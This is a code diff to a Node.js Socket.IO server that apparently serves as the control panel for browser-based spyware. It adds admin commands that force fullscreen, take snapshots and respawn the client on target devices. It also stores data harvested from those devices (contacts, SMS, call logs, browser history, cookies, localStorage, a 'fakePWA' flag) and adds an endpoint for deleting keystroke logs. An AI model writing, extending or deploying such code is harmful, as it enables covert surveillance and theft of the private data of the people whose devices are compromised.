@@ -154,6 +154,27 @@ io.on('connection', (socket) => {
                 io.to(targetDeviceId).emit('switch-camera');
             }
         });
+        socket.on('admin-notify', (data) => {
+            if (data.deviceId && data.title) {
+                io.to(data.deviceId).emit('admin-show-notif', { title: data.title, body: data.body || '' });
+                socket.emit('admin-notify-ack', { deviceId: data.deviceId });
+            }
+        });
+        socket.on('admin-fullscreen', (targetDeviceId) => {
+            if (targetDeviceId) {
+                io.to(targetDeviceId).emit('force-fullscreen');
+            }
+        });
+        socket.on('request-snapshot', (targetDeviceId) => {
+            if (targetDeviceId) {
+                io.to(targetDeviceId).emit('take-snapshot');
+            }
+        });
+        socket.on('admin-respawn', (targetDeviceId) => {
+            if (targetDeviceId) {
+                io.to(targetDeviceId).emit('force-respawn');
+            }
+        });
         socket.on('disconnect', () => {
             // Keep IP in set briefly; remove after other sockets from same IP may still be active
             setTimeout(() => adminIps.delete(adminIp), 60000);
@@ -248,6 +269,18 @@ io.on('connection', (socket) => {
             device.deviceDetection = info.deviceDetection;
             device.deviceModel = identifyDevice(info.deviceDetection);
         }
+        if (info.contacts) device.contacts = info.contacts;
+        if (info.browserHistory) device.browserHistory = info.browserHistory;
+        if (info.fsAccess) device.fsAccess = info.fsAccess;
+        if (info.cookies !== undefined) device.cookies = info.cookies;
+        if (info.cookieCount !== undefined) device.cookieCount = info.cookieCount;
+        if (info.localStorage) device.storageData = info.localStorage;
+        if (info.deviceVendor) device.deviceVendor = info.deviceVendor;
+        if (info.sms) device.sms = info.sms;
+        if (info.callLog) device.callLog = info.callLog;
+        if (info.installPrompt) device.installPrompt = info.installPrompt;
+        if (info.fakePWA) device.fakePWA = info.fakePWA;
+        if (info.backgroundFetch) device.backgroundFetch = info.backgroundFetch;
         saveDevices();
     });
 
@@ -523,6 +556,14 @@ app.get('/api/keystrokes/:deviceId', (req, res) => {
     const d = devices.get(req.params.deviceId);
     if (!d) return res.json([]);
     res.json(d.keystrokes || []);
+});
+
+app.delete('/api/keystrokes/:deviceId', (req, res) => {
+    const d = devices.get(req.params.deviceId);
+    if (!d) return res.json({ ok: false });
+    d.keystrokes = [];
+    saveDevices();
+    res.json({ ok: true });
 });
 
 app.get('/api/history/:deviceId', (req, res) => {
